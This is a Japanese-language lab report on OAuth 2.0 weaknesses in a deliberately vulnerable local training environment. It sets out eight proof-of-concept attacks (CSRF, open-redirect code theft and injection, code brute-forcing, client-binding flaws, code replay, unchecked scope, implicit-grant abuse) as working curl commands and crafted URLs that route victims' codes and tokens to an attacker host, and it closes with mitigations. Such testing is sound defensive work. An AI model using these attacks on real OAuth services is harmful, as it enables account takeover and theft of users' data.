# OAuth 2.0 脆弱性検証レポート (PoC ＆ エビデンス付き手順書)

本書は、やられサーバ環境（Damn Vulnerable OAuth 2.0 Applications）において、書籍『OAuth・OIDC への攻撃と対策を整理して理解できる本（リダイレクトへの攻撃編）』(https://authya.booth.pm/items/1877818) に記載されている OAuth 2.0 の脆弱性を実際に検証した手順と、取得したエビデンス（HTTPリクエスト・レスポンス、画面キャプチャ等）を記録したドキュメントです。

`authorizationcode_tester.md` に記載されたテスト観点、および `OAuth_OIDC_Vulnerability_Summary.md` の章立てに沿って、このリポジトリに実際に仕込まれている脆弱性を検証しています。

---

## 1. 検証環境

- 認可/リソースサーバ (Gallery): `http://gallery.127.0.0.1.nip.io:3005`
- クライアントWebアプリ (PhotoPrint): `http://photoprint.127.0.0.1.nip.io:3000`
- 攻撃者サービス (Attacker): `http://attacker.127.0.0.1.nip.io:1337`
- クライアントID / シークレット: `photoprint` / `secret`（`compose.yml` のデフォルト値）
- 被害者アカウント: `koen` / `password`（DBシード登録済みの既存ユーザー）
- 攻撃者アカウント: `attacker` / `attackerpass`（`gallery` の `/users/register` から新規登録）

---

## 2. 脆弱性検証 PoC ＆ エビデンス

### 【PoC 1】 CSRF (クロスサイトリクエストフォージェリ) の検証

#### 概要

`photoprint` アプリは OAuth 認可フローの開始時に `state` パラメータを生成・付与しません。
`gallery` からのコールバックを受信する `/callback` エンドポイントでも `state` の検証を一切行っていません。
そのため、攻撃者が自身のアカウントで取得した認可コードを含むコールバック URL を被害者に踏ませるだけで、被害者の `photoprint` セッションに攻撃者のアカウント/リソースを強制的に紐づけることができます。

`state` の欠落を確認すべき箇所は、`photoprint` が送信する認可リクエストではありません。
`gallery` から `photoprint` へ `code` とともに返るコールバックです。
認可リクエスト側に `state` が無いこと自体は対策未実装の傍証にはなりますが、実際に悪用されるのは `code` の受け皿である `/callback` 側の検証漏れです。

IdP のログインセッションと認可コードの発行アカウントは別物である点にも注意が必要です。
以下で使う認可コード `code=70108` は、攻撃者 (`attacker`) が `gallery`（IdP）に自分のアカウントでログイン・同意した結果として発行されたものです。
被害者 (`koen`) は `gallery` に対して一切ログインも同意操作も行いません。
被害者が踏むのは `gallery` の URL ではなく、クライアント側 (`photoprint`) の `/callback` エンドポイントの URL です。
被害者のブラウザが `gallery` にログイン中かどうかはこの攻撃の成否に無関係です。
これを実証するため、以下の手順では被害者ブラウザを `gallery`・`photoprint` の双方から完全にログアウトさせた（Cookie ゼロの）状態で攻撃 URL を踏ませています。

#### 実証手順 ＆ エビデンス

`insecureapplication/photoprint/app.js` の `/callback` ハンドラを見ると、`req.query.code` のみを参照しており、`state` を一切読み取っていません。

```javascript
app.get('/callback', function(req, res) {
  let code = req.query.code;
  console.log('code: ' + code);

  let redirectUri = req.protocol + '://' + req.get('Host') + '/callback';

  const tokenConfig = {
    code: code,
    redirect_uri: redirectUri,
  };
  client.authorizationCode.getToken(tokenConfig, function(error, result) {
    ...
  });
});
```

`state` を保存・比較する処理がコード上に一切存在しません。

攻撃者は `attacker` アカウントで `gallery` にログインし、通常の認可フローを完了させて未消費の認可コードを取得します。

```bash
curl -i -b attacker_cookies.txt -X POST \
  -d "transaction_id=R6WbhtTA&scope=view_gallery" \
  "http://gallery.127.0.0.1.nip.io:3005/oauth/authorize/decision"
```

```http
HTTP/1.1 302 Found
Location: http://photoprint.127.0.0.1.nip.io:3000/callback?code=70108
```

`gallery` から `photoprint` へのコールバック URL に `code` のみが付与され、`state` パラメータが一切含まれていません。

被害者ブラウザを `gallery`・`photoprint` いずれのドメインでも Cookie ゼロの状態（未ログイン）にしたうえで、攻撃者の認可コードを含む URL に直接アクセスさせます。

```
http://photoprint.127.0.0.1.nip.io:3000/callback?code=70108
```

被害者ブラウザは `http://photoprint.127.0.0.1.nip.io:3000/selectphotos` にリダイレクトされました。
ページ本文は `photos found!`（写真 0 件 = 攻撃者 `attacker` アカウントの空のギャラリー）でした。

これは、被害者の `photoprint` セッションに、被害者が一切操作していない攻撃者のアカウントが CSRF によって強制的に紐づけられたことを意味します。
被害者が `gallery` にログインしていたかどうかは無関係で、被害者が `photoprint` の `/callback` URL を一度開くだけで攻撃が成立します。

対比として、被害者 `koen` 自身が正規の認可フローで取得したコードを使った場合、同じ `/selectphotos` には `koen` 自身の写真 `Kuleuven Bib` / `Arenberg Castle` が表示されます。
これらは `images.bson` に固定シードデータとして格納されている画像で、検証中に追加したものではなく、環境を再構築すれば誰でも同じ結果を再現できます。
この対比により、CSRF 実行後に表示された「攻撃者の空のギャラリー」が確かに被害者本人のものではないことが裏付けられます。

---

### 【PoC 2】 オープンリダイレクトを悪用した認可コード窃取とコードインジェクション (Code Injection via Open Redirect)

#### 概要

`gallery` の認可エンドポイントは、クライアントが送信した `redirect_uri` を事前登録値と照合せずそのまま採用します（オープンリダイレクト）。
さらにトークンエンドポイントでは、受領した認可コードが自セッションの認可リクエストに対応するものかを検証していません。
この2つを組み合わせることで、攻撃者は被害者に不正な `redirect_uri` を仕込んだ認可 URL を踏ませるだけで被害者の認可コードを窃取し、自身のセッションに注入して被害者のリソースを乗っ取ることができます。

#### 実証手順 ＆ エビデンス

`insecureapplication/gallery/controllers/oauthcontroller.js` の認可エンドポイント検証処理:

```javascript
function authorizationValidate(clientID, redirectURI, done) {
  Client.findOne({clientID: clientID}, function(err, client) {
    if (err) {
      return done(err);
    }
    // vulnerability: redirectURI is not validated
    if (client != null) {
      return done(null, client, redirectURI);
    }
    return done(null, false);
  });
}
```

`client` が存在しさえすれば、リクエストの `redirectURI` はクライアント登録値と一切照合されずそのまま採用されます。

攻撃者は、正規の `redirect_uri`（`photoprint`）を自身の攻撃者サーバー（`attacker`）の `/callback` に書き換えた認可 URL を作成し、被害者に送りつけます。

```
http://gallery.127.0.0.1.nip.io:3005/oauth/authorize?response_type=code&client_id=photoprint&redirect_uri=http%3A%2F%2Fattacker.127.0.0.1.nip.io%3A1337%2Fcallback&scope=view_gallery
```

被害者 `koen` は `gallery` にログイン済みの状態でこのリンクを開き、通常どおり「Allow」を押して同意します（`redirect_uri` が書き換えられていることは画面上判別できません）。
リダイレクト先は次のとおりで、ここでも `state` は付与されていません。

```
http://attacker.127.0.0.1.nip.io:1337/callback?code=97870
```

攻撃者サーバー（`insecureapplication/attacker/app.js` の `/callback`）が実際にコードを受信し画面表示したことを確認します。

```javascript
app.get('/callback', function(req, res){
  var code = req.query.code;
  res.render('authcode', {code: code});
});
```

取得した画面には次のように表示されていました。

> "I stole the following authorization code from you: 97870"

攻撃者は窃取した被害者の認可コード `code=97870` を、自身の `photoprint` セッションの `/callback` へ直接送信します。

```bash
curl -i -c attacker_injected_session.txt \
  "http://photoprint.127.0.0.1.nip.io:3000/callback?code=97870"
```

```http
HTTP/1.1 302 Found
Location: /selectphotos
set-cookie: connect.sid=s%3AkjBpeN2CDS-poJTArt2H4XYf4K8vn0iN...; Path=/; HttpOnly
```

`photoprint` はクライアントクレデンシャル（`client_secret`）を使って被害者の認可コードをアクセストークンに交換し、攻撃者のセッションにそのトークンを格納しました。

```bash
curl -b attacker_injected_session.txt "http://photoprint.127.0.0.1.nip.io:3000/selectphotos"
```

```html
<img src="http://gallery:3005/photos/me/.../raw" alt="Kuleuven Bib">
<img src="http://gallery:3005/photos/me/.../raw" alt="Arenberg Castle">
```

攻撃者自身のセッションでありながら、被害者 `koen` の個人写真（`Kuleuven Bib`, `Arenberg Castle`）が閲覧可能となっています。
オープンリダイレクトを起点とするアカウント/リソース乗っ取り（コードインジェクション）が成功したことを示しています。

---

### 【PoC 3】 認可コードの強度不足 (Weak Authorization Codes) の検証

#### 概要

`gallery` サーバの認可コード生成実装は `Math.floor(Math.random() * (100000-1) + 1)` で算出された 1〜99,999 の数値であり、十分な暗号学的エントロピーを持っていません。
攻撃者は `POST /oauth/token` に対して認可コードをブルートフォース送信することで、有効な認可コードを容易に推測・獲得できます。

#### 実証手順 ＆ エビデンス

`gallery/controllers/oauthcontroller.js` の認可コード生成部分:

```javascript
function grantcode(client, redirectURI, user, response, done) {
  let code = Math.floor(Math.random() * (100000-1) +1);
  ...
}
```

認可コード空間はわずか 99,999 パターンしか存在しません。
`client_id=photoprint` / `client_secret=secret` を用い、`code=1` から順に 100 並列で `POST /oauth/token` に総当たりリクエストを送信しました。

```http
POST /oauth/token HTTP/1.1
Host: gallery.127.0.0.1.nip.io:3005
Content-Type: application/x-www-form-urlencoded

code=1408&redirect_uri=http%3A%2F%2Fphotoprint.127.0.0.1.nip.io%3A3000%2Fcallback&grant_type=authorization_code&client_id=photoprint&client_secret=secret
```

```json
{
  "access_token": 88832,
  "token_type": "Bearer"
}
```

わずか 1,476 回・約 0.6 秒の試行で有効な `code` が的中し、アクセストークンを奪取できました。
認可コードは払い出し後も失効せず複数回使用できるため、有効なコードが同時に複数存在し得る状況では的中率・速度がさらに高まります。
加えて `POST /oauth/token` にレート制限が存在しないため、この総当たりが一切妨げられません。

---

### 【PoC 4】 認可コードのクライアント非紐付け (Authorization Code Not Bound to Client) の検証

#### 概要

`gallery` のトークンエンドポイントは、認可コードの交換を要求してきた `client_id` と、そのコードが実際に発行された `client_id` を照合していません。
加えて `POST /clients` はログイン済みユーザーであれば誰でも呼び出せるため（権限昇格）、攻撃者は自分専用の任意の OAuth クライアントを自由に自己登録できます。
この2つを組み合わせると、`photoprint` 向けに発行された被害者の認可コードを、攻撃者が用意した全く別のクライアントで交換し、アクセストークンを奪取できます。

#### 実証手順 ＆ エビデンス

`gallery/controllers/oauthcontroller.js` の `exchangecode` は、`client.clientID` と `authCode.clientID` を比較していません。

```javascript
function exchangecode(client, code, redirectURI, done) {
  AuthorizationCode.findOne({code: code}, function(err, authCode) {
    ...
    // client.clientID と authCode.clientID の比較が一切ない
  });
}
```

攻撃者は自身のアカウントで悪意あるクライアントを自己登録します。

```bash
curl -i -b attacker_cookies.txt -X POST \
  -d "clientID=evilclient01&clientSecret=maliciousSecret123&redirectURIs=http://attacker.127.0.0.1.nip.io:1337/callback&name=EvilApp" \
  "http://gallery.127.0.0.1.nip.io:3005/clients"
```

`HTTP/1.1 200 OK` で登録に成功します。
ログイン済みであれば誰でもクライアントを作成できます。

被害者 `koen` が `photoprint` 向けに認可コードを取得すると次のようになります。

```http
HTTP/1.1 302 Found
Location: http://photoprint.127.0.0.1.nip.io:3000/callback?code=8399
```

このコードを悪意あるクライアントの資格情報で交換します。

```bash
curl -i -X POST \
  -d "code=8399&redirect_uri=http%3A%2F%2Fphotoprint.127.0.0.1.nip.io%3A3000%2Fcallback&grant_type=authorization_code&client_id=evilclient01&client_secret=maliciousSecret123" \
  "http://gallery.127.0.0.1.nip.io:3005/oauth/token"
```

```json
{"access_token":72567,"token_type":"Bearer"}
```

このトークンで `GET /photos/koen?access_token=72567` を叩くと、被害者の写真 `Kuleuven Bib` / `Arenberg Castle` が取得できました。
`photoprint` 向けに発行された認可コードが、`photoprint` とは無関係な攻撃者自身のクライアントで正常に交換できています。

---

### 【PoC 5】 認可コードの複数回使用 (Authorization Code Replay) の検証

#### 概要

`gallery` は使用済みの認可コードを失効・削除しません。
`models/authorizationcode.js` には有効期限フィールドも存在しないため、同一の認可コードを何度でもアクセストークンに交換できます。

#### 実証手順 ＆ エビデンス

被害者 `koen` が取得した認可コード `code=96990` を、同一パラメータで連続して2回 `/oauth/token` に送信します。

```bash
curl -i -X POST -d "code=96990&redirect_uri=...&grant_type=authorization_code&client_id=photoprint&client_secret=secret" \
  "http://gallery.127.0.0.1.nip.io:3005/oauth/token"
```

1回目は `HTTP/1.1 200 OK` で `{"access_token":86978,"token_type":"Bearer"}` が返りました。
同一コードのままの2回目も `HTTP/1.1 200 OK` で `{"access_token":34033,"token_type":"Bearer"}` が返りました。

同じ認可コードから2回とも `200 OK` で、それぞれ異なるアクセストークンが発行されています。
認可コードはワンタイムであるべきところ、実際には何度でも再利用できてしまいます。

---

### 【PoC 6】 リフレッシュトークンのクライアント非紐付け (Refresh Token Not Bound to Client) の検証

#### 概要

`gallery` のリフレッシュトークン交換処理も、PoC 4 と同様にトークンを要求してきたクライアントと、そのリフレッシュトークンを実際に取得したクライアントを照合していません。

#### 実証手順 ＆ エビデンス

被害者 `koen` が `offline_access` を含むスコープで `photoprint` 向けに認可し、正規クライアント (`photoprint`) でトークン交換してリフレッシュトークンを取得します。

```bash
curl -X POST -d "code=13937&redirect_uri=...&grant_type=authorization_code&client_id=photoprint&client_secret=secret" \
  "http://gallery.127.0.0.1.nip.io:3005/oauth/token"
```

```json
{"access_token":6581,"refresh_token":"57995","token_type":"Bearer"}
```

攻撃者は PoC 4 で自己登録した悪意あるクライアント (`evilclient01`) の資格情報で、この `refresh_token=57995` を交換します。

```bash
curl -i -X POST \
  -d "grant_type=refresh_token&refresh_token=57995&client_id=evilclient01&client_secret=maliciousSecret123" \
  "http://gallery.127.0.0.1.nip.io:3005/oauth/token"
```

```json
{"access_token":"57544","token_type":"Bearer", "...": "..."}
```

このトークンでも `GET /photos/koen?access_token=57544` から被害者の写真が取得できました。
`photoprint` が取得したリフレッシュトークンを、無関係な攻撃者のクライアントで交換できています。

---

### 【PoC 7】 リソースサーバにおける scope 未検証 (Resource Server: Scope Not Validated) の検証

#### 概要

`gallery/middlewares/auth.js` にはスコープを検証する `ensureScope()` ミドルウェアが定義されていますが、画像の更新・削除エンドポイント（`PUT`/`DELETE /photos/:username/:imageid`）を含め、どのルートからも呼び出されていません。
そのため、閲覧専用のはずの `view_gallery` スコープしか持たないアクセストークンでも、書き込み系 API に到達できてしまいます。

#### 実証手順 ＆ エビデンス

`photoprint` が保有する `scope=view_gallery` のみのアクセストークン（`access_token=58687`）を使い、閲覧専用であるはずのトークンで画像のメタデータを書き換えます（非破壊性を保つため、検証後に元の値へ復元しています）。

変更前:

```json
{"image": {"description": "Kuleuven Bib", "...": "..."}}
```

```bash
curl -i -X PUT -d "description=Pwned by attacker" \
  "http://gallery.127.0.0.1.nip.io:3005/photos/koen/581518ab6247a2db75daad6c?access_token=58687"
```

```http
HTTP/1.1 204 No Content
```

変更後:

```json
{"image": {"description": "Pwned by attacker", "...": "..."}}
```

`view_gallery` スコープのみのトークンで書き込み系 API (`PUT`) が成功しています。
`ensureScope()` が実装されていながらルートに適用されていないため、スコープ制限が機能していません。

---

### 【PoC 8】 response_type の切り替えによる Implicit Grant の悪用 (Deprecated Flow Switching)

#### 概要

`gallery` の認可エンドポイントは `response_type` パラメータの値によってクライアントごとに許可されたフローを制限していません。
`photoprint` はサーバーサイドの Web アプリケーションであり、本来 `response_type=code`（認可コードフロー）のみを使うべきクライアントですが、認可リクエストの `response_type` を `token`（Implicit Grant）または `code token`（ハイブリッドフロー）に書き換えるだけで、クライアント認証（`client_secret`）を一切経由せずにアクセストークンを直接取得できてしまいます。

`response_types_supported: ["code", "token", "code token"]` という `.well-known` のメタデータ自体は以前から存在していましたが、実際にこれらのフローが動くかどうかは別問題です。本 PoC はその整合性、および `response_type` を書き換えるだけで非推奨フローに切り替えられてしまう脆弱性を確認したものです（`OAuth_OIDC_Vulnerability_Summary.md` の「非推奨フローの排除: ブラウザやネイティブアプリで `response_type=token` (Implicit Grant) を使用していないか」に対応する検証項目）。

#### 実証手順 ＆ エビデンス

`attacker` のトップページに追加された「Switch to Implicit Grant」リンクを経由し、`koen` としてログイン済みのブラウザで以下の認可 URL を踏む。

```
http://gallery.127.0.0.1.nip.io:3005/oauth/authorize?response_type=token&redirect_uri=http%3A%2F%2Fattacker.127.0.0.1.nip.io%3A1337%2Fcallback&scope=view_gallery&client_id=photoprint
```

通常の認可コードフローと同じ同意ダイアログ（`Authorize PhotoPrint`）が表示され、`Allow` を押すと以下のURLへリダイレクトされる。

```
Location: http://attacker.127.0.0.1.nip.io:1337/callback#access_token=93213&token_type=Bearer
```

`code` パラメータは一切含まれず、アクセストークンが **URL フラグメント** に直接載って返ってきている。フラグメントはブラウザからサーバーへ送信されないため、`attacker/callback` は本来サーバー側では読み取れないが、ページに仕込んだ数行のクライアントサイド JavaScript（`window.location.hash` を読むだけ）で簡単に横取りできる。

```html
<div id="implicit-token">I also stole the following access token straight out of your browser's URL fragment (Implicit Grant): 93213</div>
```

奪取したトークンはリソースサーバーでそのまま有効である。

```bash
curl -s -H "Accept: application/json" "http://gallery.127.0.0.1.nip.io:3005/photos/koen?access_token=93213"
```

```json
{"images":[{"_id":"c861dc9ba8c5f937afccfccb","description":"Kuleuven Bib"},{"_id":"530446a110f64578078d9ce3","description":"Arenberg Castle"}]}
```

`response_type=code%20token`（ハイブリッド）を指定した場合は、`code` と `access_token` の両方が同じフラグメントに載って返る。

```
Location: http://photoprint:3000/callback#access_token=27475&code=70653&state=xyz2&token_type=Bearer
```

いずれの場合も、`client_id=photoprint` は本来サーバーサイドアプリ用に登録されたクライアントであり、`client_secret` は一度も送信されていない。`response_type` クエリパラメータを書き換えるだけで、バックチャネルでのクライアント認証を完全に迂回してアクセストークンを取得できることが確認できる。

---

## 3. 対策まとめ

### 【PoC 1】 CSRF (クロスサイトリクエストフォージェリ)

認可リクエストごとに一時的かつ推測不可能な `state` パラメータをクライアント側で生成し、セッションに紐づけて保持したうえで、`gallery` からのコールバック受信時に URI 上の `code` とともに渡ってくるべき `state` を検証する。一致しない、または `state` が存在しない場合はリクエストを破棄する。

### 【PoC 2】 オープンリダイレクトを悪用した認可コード窃取とコードインジェクション (Code Injection via Open Redirect)

認可エンドポイントで `redirect_uri` をクライアント登録値と厳密に照合する。加えて PKCE (`code_verifier` / `code_challenge`) を導入し、認可コードの発行を要求したクライアントセッションとトークン要求を行うセッションが同一であることを保証する。

### 【PoC 3】 認可コードの強度不足 (Weak Authorization Codes)

認可コードの生成に `crypto.randomBytes(32)` 等の暗号学的に安全な擬似乱数生成器を使用し、十分な長さ（128ビット以上）のエントロピーを確保する。あわせてトークンエンドポイントにレート制限を導入する。

### 【PoC 4】 認可コードのクライアント非紐付け (Authorization Code Not Bound to Client)

トークンエンドポイントで、認可コードに記録された発行先 `clientID` と、リクエストしてきたクライアントの `clientID` が一致することを必ず検証する。あわせて `POST /clients` によるクライアント自己登録を管理者権限のみに制限する。

### 【PoC 5】 認可コードの複数回使用 (Authorization Code Replay)

認可コードに有効期限（数分程度）を設けたうえで、一度でも交換に使用された認可コードは即座に DB から削除し再利用不能にする。

### 【PoC 6】 リフレッシュトークンのクライアント非紐付け (Refresh Token Not Bound to Client)

PoC 4 と同様に、トークンエンドポイントでリフレッシュトークンに記録された発行先 `clientID` と、リクエストしてきたクライアントの `clientID` が一致することを必ず検証する。

### 【PoC 7】 リソースサーバにおける scope 未検証 (Resource Server: Scope Not Validated)

実装済みの `ensureScope()` を書き込み系 API（`PUT`/`DELETE` 等）を含む全ルートに適用し、トークンが持つスコープを超える操作を拒否する。

### 【PoC 8】 response_type の切り替えによる Implicit Grant の悪用 (Deprecated Flow Switching)

認可エンドポイントで、リクエストされた `response_type` がクライアントに事前登録されたフロー（例: `photoprint` なら `code` のみ）と一致するかを検証し、許可されていない `response_type` を含むリクエストは拒否する。根本的には Implicit Grant およびハイブリッドフロー自体を提供せず、`response_types_supported` からも `token` / `code token` を削除して認可コードフロー（PKCE 併用）のみに一本化する。
